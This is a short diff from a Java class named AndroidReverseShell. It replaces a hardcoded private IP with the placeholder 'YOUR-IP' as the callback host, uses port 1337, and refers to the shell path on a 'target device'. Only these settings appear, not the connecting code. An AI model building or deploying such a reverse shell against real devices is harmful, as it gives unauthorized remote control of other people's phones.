@@ -16,7 +16,7 @@ import java.net.InetSocketAddress;
 public class AndroidReverseShell {
 
   // change these to values to your liking
-  private final static String HOST = "192.168.1.26";
+  private final static String HOST = "YOUR-IP";
   private final static int PORT = 1337;
 
   // `sh` should be on this path but verify on your target device
